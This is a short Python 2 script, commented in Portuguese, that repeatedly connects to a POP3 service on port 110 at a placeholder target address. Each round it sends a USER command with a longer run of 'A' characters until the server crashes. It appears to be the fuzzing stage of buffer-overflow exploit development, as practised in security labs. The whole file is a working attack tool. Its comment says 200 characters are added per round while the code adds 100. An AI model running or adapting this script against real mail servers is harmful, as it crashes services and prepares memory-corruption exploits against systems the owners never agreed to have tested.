#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import socket,time,sys

fuzz = ""

# Incrementa a variável "fuzz" adicionando 200 "A" até que a Aplicacao quebre
while True:
    fuzz += "A" * 100
    print("Enviando {} bytes para tentar quebrar a aplicacao".format(len(fuzz)))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(("TARGET_IP", 110))
    s.recv(1024)

    s.send(b"USER " + fuzz.encode() + b"\r\n")
    print (s.recv(1024))
    s.send(b"QUIT\r\n")
    s.close()
    time.sleep(1)
